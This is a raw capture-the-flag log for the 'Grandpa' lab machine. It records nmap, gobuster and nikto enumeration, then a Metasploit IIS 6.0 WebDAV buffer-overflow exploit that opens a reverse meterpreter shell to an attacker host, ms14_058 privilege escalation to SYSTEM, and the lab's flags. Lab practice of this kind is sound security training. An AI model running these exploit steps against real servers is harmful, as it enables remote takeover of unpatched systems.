Grandpa IP:10.10.10.14



rustscan:
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack




nmap:
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Microsoft IIS httpd 6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|   Server Date: Sat, 28 Jan 2023 14:15:14 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|_  Server Type: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows




gobuster:
gobuster dir  -u http://10.10.10.14  -w /usr/share/wordlists/dirb/common.txt -t 64                                  
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.14
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/01/28 09:13:06 Starting gobuster
===============================================================
/_private (Status: 403)
/_vti_bin (Status: 301)
/_vti_cnf (Status: 403)
/_vti_bin/shtml.dll (Status: 200)
/_vti_bin/_vti_adm/admin.dll (Status: 200)
/_vti_bin/_vti_aut/author.dll (Status: 200)
/_vti_log (Status: 403)
/_vti_pvt (Status: 403)
/_vti_txt (Status: 403)
/aspnet_client (Status: 403)
/Images (Status: 301)
/images (Status: 301)
===============================================================
2023/01/28 09:13:11 Finished
===============================================================




nikto:

nikto -h 10.10.10.14                                                                                                           
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.14
+ Target Hostname:    10.10.10.14
+ Target Port:        80
+ Start Time:         2023-01-28 09:11:12 (GMT-5)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/6.0
+ Retrieved microsoftofficewebserver header: 5.0_Pub
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 1.1.4322
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Retrieved dasl header: <DAV:sql>
+ Retrieved dav header: 1, 2
+ Retrieved ms-author-via header: MS-FP/4.0,DAV
+ Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
+ WebDAV enabled (PROPPATCH SEARCH MKCOL PROPFIND COPY LOCK UNLOCK listed as allowed)
+ OSVDB-13431: PROPFIND HTTP verb may show the server's internal IP address: http://10.10.10.14/
+ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
+ OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found.
+ OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).
+ OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376. http://www.securityfocus.com/bid/2252.
+ OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST.
+ /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.
+ 8015 requests: 0 error(s) and 27 item(s) reported on remote host
+ End Time:           2023-01-28 09:18:59 (GMT-5) (467 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested




searchsploit:

searchsploit webdav     
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                     |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache 1.3.12 - WebDAV Directory Listings                                                                                                                          | linux/remote/20210.txt
Apache JackRabbit - WebDAV XML External Entity                                                                                                                     | java/webapps/37110.py
Apache Tomcat - 'WebDAV' Remote File Disclosure                                                                                                                    | multiple/remote/4530.pl
Apache Tomcat - WebDAV SSL Remote File Disclosure                                                                                                                  | linux/remote/4552.pl
Copy to WebDAV 1.1 iOS - Multiple Vulnerabilities                                                                                                                  | ios/webapps/27655.txt
Liferay 6.0.x - WebDAV File Reading                                                                                                                                | multiple/remote/18763.txt
Microsoft IIS - WebDAV 'ntdll.dll' Remote Overflow                                                                                                                 | windows/remote/1.c
Microsoft IIS - WebDav 'ScStoragePathFromUrl' Remote Overflow (Metasploit)                                                                                         | windows/remote/41992.rb
Microsoft IIS - WebDAV Write Access Code Execution (Metasploit)                                                                                                    | windows/remote/16471.rb
Microsoft IIS - WebDAV XML Denial of Service (MS04-030)                                                                                                            | windows/dos/585.pl
Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV 'ntdll.dll' Remote Buffer Overflow (1)                                                                         | windows/remote/22365.pl
Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV 'ntdll.dll' Remote Buffer Overflow (2)                                                                         | windows/remote/22366.c
Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV 'ntdll.dll' Remote Buffer Overflow (3)                                                                         | windows/remote/22367.txt
Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV 'ntdll.dll' Remote Buffer Overflow (4)                                                                         | windows/remote/22368.txt
Microsoft IIS 5.0 - WebDAV 'ntdll.dll' Path Overflow (MS03-007) (Metasploit)                                                                                       | windows/remote/16470.rb
Microsoft IIS 5.0 - WebDAV Denial of Service                                                                                                                       | windows/dos/20664.pl
Microsoft IIS 5.0 - WebDAV Lock Method Memory Leak Denial of Service                                                                                               | windows/dos/20854.txt
Microsoft IIS 5.0 - WebDAV PROPFIND / SEARCH Method Denial of Service                                                                                              | windows/dos/22670.c
Microsoft IIS 5.0 - WebDAV Remote                                                                                                                                  | windows/remote/2.c
Microsoft IIS 5.0 - WebDAV Remote Code Execution (3) (xwdav)                                                                                                       | windows/remote/51.c
Microsoft IIS 5.1 - WebDAV HTTP Request Source Code Disclosure                                                                                                     | windows/remote/26230.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                                                                           | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass                                                                                                            | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                                                                        | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                                                                        | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                                                                                    | windows/remote/8754.patch
Microsoft Windows - WebDAV Remote Code Execution (2)                                                                                                               | windows/remote/36.c
Microsoft Windows 7 - 'WebDAV' Local Privilege Escalation (MS16-016) (2)                                                                                           | windows/local/39788.txt
Microsoft Windows 7 SP1 (x86) - 'WebDAV' Local Privilege Escalation (MS16-016) (1)                                                                                 | windows_x86/local/39432.c
Microsoft Windows 7 SP1 - 'mrxdav.sys' WebDAV Privilege Escalation (MS16-016) (Metasploit)                                                                         | windows/local/40085.rb
Microsoft Windows 8.1 - Local WebDAV NTLM Reflection Privilege Escalation                                                                                          | windows/local/36424.txt
Neon WebDAV Client Library 0.2x - Format String                                                                                                                    | linux/dos/23999.txt
Nginx 0.7.61 - WebDAV Directory Traversal                                                                                                                          | multiple/remote/9829.txt
Sun Java System Web Server 6.1/7.0 - WebDAV Format String                                                                                                          | multiple/dos/33560.txt
Sun Java Web Server - System WebDAV OPTIONS Buffer Overflow (Metasploit)                                                                                           | multiple/remote/16314.rb
WebDAV - Application DLL Hijacker (Metasploit)                                                                                                                     | windows/remote/16550.rb
XAMPP - WebDAV PHP Upload (Metasploit)                                                                                                                             | windows/remote/18367.rb
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcode Title                                                                                                                                                   |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Windows/x86 - Download File (//192.168.1.19/c) Via WebDAV + Execute Null-Free Shellcode (96 bytes)                                                                 | windows_x86/39519.c
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Papers: No Results


msfconsole:

msf6 > search webdav

Matching Modules
================

   #   Name                                                      Disclosure Date  Rank       Check  Description
   -   ----                                                      ---------------  ----       -----  -----------
   0   exploit/osx/browser/safari_file_policy                    2011-10-12       normal     No     Apple Safari file:// Arbitrary Code Execution
   1   exploit/windows/misc/vmhgfs_webdav_dll_sideload           2016-08-05       normal     No     DLL Side Loading Vulnerability in VMware Host Guest Client Redirector
   2   exploit/windows/scada/ge_proficy_cimplicity_gefebt        2014-01-23       excellent  Yes    GE Proficy CIMPLICITY gefebt.exe Remote Code Execution
   3   auxiliary/scanner/http/webdav_internal_ip                                  normal     No     HTTP WebDAV Internal IP Scanner
   4   auxiliary/scanner/http/webdav_scanner                                      normal     No     HTTP WebDAV Scanner
   5   auxiliary/scanner/http/webdav_website_content                              normal     No     HTTP WebDAV Website Content Scanner
   6   exploit/windows/misc/ibm_director_cim_dllinject           2009-03-10       excellent  Yes    IBM System Director Agent DLL Injection
   7   exploit/windows/browser/keyhelp_launchtripane_exec        2012-06-26       excellent  No     KeyHelp ActiveX LaunchTriPane Remote Code Execution Vulnerability
   8   exploit/windows/iis/ms03_007_ntdll_webdav                 2003-05-30       great      Yes    MS03-007 Microsoft IIS 5.0 WebDAV ntdll.dll Path Overflow
   9   exploit/windows/ssl/ms04_011_pct                          2004-04-13       average    No     MS04-011 Microsoft Private Communications Transport Overflow
   10  auxiliary/scanner/http/dir_webdav_unicode_bypass                           normal     No     MS09-020 IIS6 WebDAV Unicode Auth Bypass Directory Scanner
   11  auxiliary/scanner/http/ms09_020_webdav_unicode_bypass                      normal     No     MS09-020 IIS6 WebDAV Unicode Authentication Bypass
   12  exploit/windows/browser/ms10_022_ie_vbscript_winhlp32     2010-02-26       great      No     MS10-022 Microsoft Internet Explorer Winhlp32.exe MsgBox Code Execution
   13  exploit/windows/local/ms16_016_webdav                     2016-02-09       excellent  Yes    MS16-016 mrxdav.sys WebDav Local Privilege Escalation
   14  exploit/windows/browser/ms10_042_helpctr_xss_cmd_exec     2010-06-09       excellent  No     Microsoft Help Center XSS and Command Execution
   15  exploit/windows/iis/iis_webdav_upload_asp                 2004-12-31       excellent  No     Microsoft IIS WebDAV Write Access Code Execution
   16  exploit/windows/iis/iis_webdav_scstoragepathfromurl       2017-03-26       manual     Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow
   17  exploit/windows/browser/ms10_046_shortcut_icon_dllloader  2010-07-16       excellent  No     Microsoft Windows Shell LNK Code Execution
   18  exploit/windows/browser/oracle_webcenter_checkoutandopen  2013-04-16       excellent  No     Oracle WebCenter Content CheckOutAndOpen.dll ActiveX Remote Code Execution
   19  exploit/windows/http/sap_host_control_cmd_exec            2012-08-14       average    Yes    SAP NetWeaver HostControl Command Injection
   20  exploit/windows/misc/webdav_delivery                      1999-01-01       manual     No     Serve DLL via webdav server
   21  exploit/multi/svn/svnserve_date                           2004-05-19       average    No     Subversion Date Svnserve
   22  exploit/multi/http/sun_jsws_dav_options                   2010-01-20       great      Yes    Sun Java System Web Server WebDAV OPTIONS Buffer Overflow
   23  exploit/windows/browser/java_ws_double_quote              2012-10-16       excellent  No     Sun Java Web Start Double Quote Injection
   24  exploit/windows/browser/java_ws_arginject_altjvm          2010-04-09       excellent  No     Sun Java Web Start Plugin Command Line Argument Injection
   25  exploit/windows/browser/java_ws_vmargs                    2012-02-14       excellent  No     Sun Java Web Start Plugin Command Line Argument Injection
   26  exploit/windows/browser/ubisoft_uplay_cmd_exec            2012-07-29       normal     No     Ubisoft uplay 2.0.3 ActiveX Control Arbitrary Code Execution
   27  exploit/windows/browser/webdav_dll_hijacker               2010-08-18       manual     No     WebDAV Application DLL Hijacker
   28  exploit/windows/browser/ms07_017_ani_loadimage_chunksize  2007-03-28       great      No     Windows ANI LoadAniIcon() Chunk Size Stack Buffer Overflow (HTTP)
   29  post/windows/escalate/droplnk                                              normal     No     Windows Escalate SMB Icon LNK Dropper
   30  exploit/windows/http/xampp_webdav_upload_php              2012-01-14       excellent  No     XAMPP WebDAV PHP Upload


Interact with a module by name or index. For example info 30, use 30 or use exploit/windows/http/xampp_webdav_upload_php



msf6 > use 16
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86


msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOSTS 10.10.10.14
RHOSTS => 10.10.10.14
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set LHOST 10.10.14.14
LHOST => 10.10.14.14
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS         10.10.10.14      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.14      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86


msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run

[*] Started reverse TCP handler on 10.10.14.14:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (175686 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.14.14:4444 -> 10.10.10.14:1032) at 2023-01-28 09:16:19 -0500

meterpreter > whoami
[-] Unknown command: whoami
meterpreter > ps
Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
 272   4     smss.exe
 320   272   csrss.exe
 344   272   winlogon.exe
 392   344   services.exe
 404   344   lsass.exe
 584   392   svchost.exe
 668   392   svchost.exe
 732   392   svchost.exe
 752   392   svchost.exe
 788   392   svchost.exe
 924   392   spoolsv.exe
 952   392   msdtc.exe
 1064  392   cisvc.exe
 1112  392   svchost.exe
 1168  392   inetinfo.exe
 1204  392   svchost.exe
 1308  392   VGAuthService.exe
 1380  392   vmtoolsd.exe
 1484  392   svchost.exe
 1592  392   svchost.exe
 1772  392   dllhost.exe
 1936  1064  cidaemon.exe
 1940  392   alg.exe
 1968  584   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 2164  1064  cidaemon.exe
 2204  1484  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 2300  1064  cidaemon.exe
 2356  584   wmiprvse.exe
 2460  584   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 2540  1484  w3wp.exe
 2952  788   wmiadap.exe
 3792  2204  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe

meterpreter > migrate 2204
[*] Migrating from 3792 to 2204...
[*] Migration completed successfully.


meterpreter > sysinfo
Computer        : GRANPA
OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 3
Meterpreter     : x86/windows


msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.14 - Collecting local exploits for x86/windows...
[*] 10.10.10.14 - 173 exploit checks are being tried...
[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] 10.10.10.14 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/ms14_070_tcpip_ioctl                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.

 msf6 > use exploit/windows/local/ms14_058_track_popup_menu
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms14_058_track_popup_menu) > show options

Module options (exploit/windows/local/ms14_058_track_popup_menu):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf6 exploit(windows/local/ms14_058_track_popup_menu) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/ms14_058_track_popup_menu) > set LHOST 10.10.14.14
LHOST => 10.10.14.14
msf6 exploit(windows/local/ms14_058_track_popup_menu) > run

[*] Started reverse TCP handler on 10.10.14.14:4444 
[*] Reflectively injecting the exploit DLL and triggering the exploit...
[*] Launching netsh to host the DLL...
[+] Process 3612 launched.
[*] Reflectively injecting the DLL into 3612...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175686 bytes) to 10.10.10.14
[*] Meterpreter session 2 opened (10.10.14.14:4444 -> 10.10.10.14:1033) at 2023-01-28 09:24:01 -0500

meterpreter > whoami
[-] Unknown command: whoami
meterpreter > shell
Process 4056 created.
Channel 1 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\system

c:\windows\system32\inetsrv>


user flag: bdff5ec67c3cff017f2bedc146a5d869
root flag: 9359e905a2c35f861f6a57cecf28bb7b


